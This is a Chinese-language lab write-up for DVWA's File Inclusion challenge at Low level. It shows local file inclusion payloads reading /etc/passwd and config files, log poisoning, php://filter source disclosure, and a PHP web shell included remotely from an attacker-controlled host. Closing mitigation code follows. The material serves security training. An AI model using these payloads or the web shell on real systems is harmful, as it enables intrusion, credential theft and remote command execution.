# DVWA File Inclusion (Low) 通关 WriteUp

## 一、漏洞概述

**文件包含漏洞（File Inclusion）** 是指应用程序通过参数动态引入文件时，未对用户输入进行严格校验，导致攻击者可以包含任意文件。根据包含的文件来源，分为两类：

- **本地文件包含（LFI，Local File Inclusion）**：包含服务器本地的文件，如 `/etc/passwd`、配置文件、日志等。
- **远程文件包含（RFI，Remote File Inclusion）**：包含远程服务器上的文件，通常需要 PHP 配置 `allow_url_include = On`。

DVWA 的 **File Inclusion** 模块通过 URL 的 `page` 参数动态包含文件。Low 级别没有任何过滤，是最直观的练习场景。

将 DVWA 安全级别设置为 **Low**，进入 **File Inclusion** 模块。

## 二、源码分析

查看 Low 级别源码：

```php
<?php
$file = $_GET['page'];
include($file);
?>
```

关键点：

1. `page` 参数通过 **GET** 方式提交。
2. 参数未经过任何过滤、白名单校验或路径限制。
3. 直接使用 `include()` 包含用户指定的文件。
4. 因此可以包含本地任意文件，若 `allow_url_include` 开启，还可以包含远程文件。

## 三、本地文件包含（LFI）

### 1\. 正常访问

页面默认 URL 类似：

```text
http://靶机IP/dvwa/vulnerabilities/fi/?page=include.php
```

页面正常显示。

### 2\. 读取系统敏感文件

在 Linux 环境下，尝试读取 `/etc/passwd`：

```text
http://靶机IP/dvwa/vulnerabilities/fi/?page=/etc/passwd
```

如果直接使用绝对路径成功，页面会显示 `/etc/passwd` 的内容。

如果绝对路径被限制或需要相对路径，可以使用 `../` 逐级向上跳转：

```text
http://靶机IP/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```

具体需要多少个 `../` 取决于当前脚本所在目录深度。可以从 1 开始逐步增加，直到成功读取。

### 3\. 读取 DVWA 配置文件

DVWA 的配置文件通常位于：

```text
/dvwa/config/config.inc.php
```

可以尝试包含：

```text
?page=../../config/config.inc.php
```

成功后可获取数据库用户名、密码等敏感信息。

### 4\. 读取 Apache 日志

如果日志文件可读，可以包含：

```text
?page=/var/log/apache2/access.log
```

结合日志投毒，可以将 PHP 代码写入 User-Agent，然后包含日志文件执行代码，从而 GetShell。

### 5\. 使用 PHP 伪协议读取源码

即使文件是 PHP 源码，直接包含会被执行而不是显示源码。可以使用 `php://filter` 伪协议进行 Base64 编码读取：

```text
?page=php://filter/convert.base64-encode/resource=index.php
```

页面会返回 Base64 编码后的源码，解码即可查看。

## 四、远程文件包含（RFI）

### 1\. 前提条件

RFI 需要 PHP 配置：

```ini
allow_url_fopen = On
allow_url_include = On
```

DVWA 的默认环境通常已开启。

### 2\. 在攻击机准备恶意文件

创建一个 `shell.txt` 或 `shell.php`，内容：

```php
<?php
echo "RFI Test";
system($_GET['cmd']);
?>
```

将文件放在攻击机的 Web 目录，例如：

```text
http://攻击者IP/shell.txt
```

### 3\. 远程包含

在 DVWA 中提交：

```text
http://靶机IP/dvwa/vulnerabilities/fi/?page=http://攻击者IP/shell.txt
```

如果成功，页面会执行 `shell.txt` 中的 PHP 代码。随后可以通过 `cmd` 参数执行系统命令：

```text
http://靶机IP/dvwa/vulnerabilities/fi/?page=http://攻击者IP/shell.txt&cmd=whoami
```

### 4\. 使用 data:// 伪协议

如果 `allow_url_include` 开启，还可以使用 `data://` 直接执行代码：

```text
?page=data://text/plain,<?php system('whoami'); ?>
```

或者 Base64 编码：

```text
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
```

## 五、Burp Suite 验证

由于浏览器可能对 URL 中的特殊字符进行编码，可以用 Burp Suite 的 Repeater 直接修改 `page` 参数：

1. 拦截请求：
   ```http
    GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1
    Host: 靶机IP
    Cookie: PHPSESSID=...; security=low
   ```
2. 将 `page` 改为：
   ```text
    page=../../../../etc/passwd
   ```
3. 发送请求，查看响应体中是否包含 `/etc/passwd` 内容。

## 六、漏洞成因与防御

**成因**：

1. 用户输入未经过白名单校验，直接传入 `include()`。
2. 未限制包含路径，允许 `../` 跳转。
3. 未禁用危险伪协议和远程包含。

**防御措施**：

1. **白名单校验（首选）**  
   只允许包含预定义的文件名，例如：
   ```php
    $allowed = ['include.php', 'about.php', 'contact.php'];
    $file = $_GET['page'];
    if (!in_array($file, $allowed)) {
        die("Invalid file");
    }
    include($file);
   ```
2. **禁用远程包含**  
   在 `php.ini` 中设置：
   ```ini
    allow_url_include = Off
    allow_url_fopen = Off
   ```
3. **过滤路径穿越字符**  
   过滤 `../`、`..\`、`%2e%2e%2f` 等编码形式。
4. **限制包含目录**  
   使用 `basename()` 或 `realpath()` 限制文件必须在指定目录内：
   ```php
    $base = '/var/www/dvwa/includes/';
    $file = basename($_GET['page']);
    $path = $base . $file;
    if (strpos(realpath($path), realpath($base)) !== 0) {
        die("Invalid path");
    }
    include($path);
   ```
5. **关闭危险伪协议**  
   禁用 `php://filter`、`data://`、`php://input` 等不必要的协议。

## 七、总结

Low 级别没有任何过滤，可以轻松实现 LFI 和 RFI：

- LFI：`?page=../../../../etc/passwd` 读取系统文件，或 `php://filter` 读取源码。
- RFI：`?page=http://攻击者IP/shell.txt` 包含远程 shell，进而 GetShell。

核心问题是用户输入直接进入 `include()`，防御应以白名单为主，配合禁用远程包含和路径限制。